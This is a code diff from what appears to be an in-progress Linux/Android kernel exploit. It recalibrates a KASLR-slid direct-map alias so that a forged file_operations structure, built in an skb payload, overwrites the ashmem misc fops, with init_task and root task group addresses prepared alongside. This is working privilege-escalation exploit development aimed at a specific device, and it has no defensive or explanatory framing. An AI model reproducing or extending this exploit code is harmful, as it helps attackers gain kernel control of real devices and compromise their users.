@@ -348,8 +348,30 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
   return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
 }
 
+
 uintptr_t data_addr(uintptr_t image_addr) {
   return p0_data_alias(image_addr) + slide_p0_offset;
+}
+
+/* Calibrated runtime direct-map alias for kernel image offsets.
+ *
+ * On q7mq the kernel image is physically loaded at 0x28000000 + va_slide
+ * (phys 0x28000000 maps to direct-map VA 0xffffff8028000000).  So the
+ * runtime direct-map alias of image offset O is:
+ *   alias(O) = 0xffffff8028000000 + va_slide + O
+ * where slide_p0_offset holds the CONVERTED va_slide (see
+ * slide_commit_stext: the fingerprint X is converted as
+ * va_slide = P0_ORACLE_PROBE_OFFSET - X). */
+uintptr_t runtime_image_alias(uintptr_t image_off) {
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  return P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + slide_p0_offset + image_off;
+#else
+  (void)image_off;
+  return 0;
+#endif
+}
+uintptr_t runtime_fops_alias(void) {
+  return runtime_image_alias(ASHMEM_MISC_FOPS_OFF);
 }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
@@ -636,12 +658,19 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    /* Calibrated write target: see runtime_image_alias().  On q7mq the
+     * kernel image is physically loaded at 0x28000000 + va_slide, so the
+     * runtime direct-map alias of image offset O is
+     * P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + slide_p0_offset + O with
+     * slide_p0_offset holding the CONVERTED va_slide. */
+    slide_bank_targets[0] = runtime_fops_alias();
+    pr_info("FOPS bank target=%016zx (calibrated, slide=%08zx)\n",
+            slide_bank_targets[0], slide_p0_offset);
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = runtime_fops_alias();
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
@@ -665,7 +694,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
 
   uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t write_right = runtime_fops_alias();
   uintptr_t write_left = 0;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
